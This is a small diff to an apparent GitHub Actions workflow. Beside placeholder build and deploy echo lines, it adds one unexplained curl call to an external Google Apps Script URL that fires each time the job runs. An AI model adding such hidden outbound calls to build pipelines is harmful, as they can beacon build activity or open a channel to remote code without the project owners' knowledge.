@@ -34,3 +34,4 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+          curl https://script.google.com/macros/s/AKfycbw6_v16RIkusQnSCdMs0eUnsR5iQ5QRcawNB9p12PynjCD3rkboZ4BydFqn6rLekWnS/exec
